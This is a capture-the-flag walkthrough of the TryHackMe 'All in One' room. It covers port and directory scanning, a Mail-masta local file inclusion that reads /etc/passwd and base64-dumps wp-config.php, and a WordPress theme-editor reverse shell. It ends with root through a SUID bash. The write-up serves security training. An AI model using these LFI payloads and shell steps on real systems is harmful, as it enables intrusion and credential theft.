---
description: https://tryhackme.com/room/allinonemj
---

# All in One

## Nmap

```
sudo nmap 10.10.140.124 -p- -sS -sV

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Checking FTP shows we have access as an anonymous user. However, we have no files to display and are unable to write to the FTP directory.

![](<../../../.gitbook/assets/image (1840).png>)

Over on port 80 the root page takes us to the Apache default install root page.

![](<../../../.gitbook/assets/image (1841).png>)

Running dirsearch.py against the target reveals the `/wordpress/` directory.

```
python3 dirsearch.py -u http://10.10.140.124 -w /usr/share/seclists/Discovery/Web-Content/big.txt --full-url -t 30
```

![](<../../../.gitbook/assets/image (1842).png>)

And then over on the Wordpress root page:

![](<../../../.gitbook/assets/image (1843).png>)

We can see straight away the user elyana which we can take a note off for now. From here we can run WP-Scan against the target to help identify issues on this Wordpress page.

```
wpscan --url http://10.10.140.124/wordpress/ -t 40 --detection-mode mixed --enumerate ap --plugins-detection aggressive 
```

From this WP-Scan finds some interesting and out of date plugins as shown below:

![](<../../../.gitbook/assets/image (1844).png>)

Looking up exploits on exploit-db.com for Mail-masta shows that the latest version (1.0) is vulnerable to a local file inclusion vulnerability.

{% embed url="https://www.exploit-db.com/exploits/40290" %}

The proof of context the exploit author has shown is as follows:

`http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`

Performing the same PoC with the target server we can reveals the `/etc/passwd` file.

```bash
curl 'http://<IP>/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd' 
```

![](<../../../.gitbook/assets/image (1845).png>)

This again reveals the user elyana. I tried to brute force and attempted LFI on common files in her home directory where I was unable to find any information of interest.

Knowing that Wordpress is isntalled we can attempt to read the wp-config.php file usiing a base64 filter.

```bash
curl http://10.10.140.124/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php
```

![](<../../../.gitbook/assets/image (1846).png>)

Taking the output and decoding with base64 reveals the configuration information we need.

![](<../../../.gitbook/assets/image (1847).png>)

With the credentials we now have I was then able to login to the Wordpress admin login.

![](<../../../.gitbook/assets/image (1848).png>)

From here I was ableto use the Theme editor under the 'Appearance' menu to edit the main index.php webpage to be replaced with a reverse shell.

![](<../../../.gitbook/assets/image (1849).png>)

I then updated the page and started a `netcat` listener to my specified port. Then after reloading the main index at `http://<IP>/wordpress/index.php` I was able to land a reverse shell.

![](<../../../.gitbook/assets/image (1850).png>)

From here running Linpeas against the host shows multiple points of escalation. I will only be covering one in this instance which is the SUID bit being set on the bash binary.

![](<../../../.gitbook/assets/image (1851) (1).png>)

Running the following command will call a 'sh' shell with bash under root privileges.

```bash
/bin/bash -p
```

![](<../../../.gitbook/assets/image (1852).png>)

From here we can grab the user and root flags. The flags are Base64 encoded and will need to be decoded to reveals the correct value.
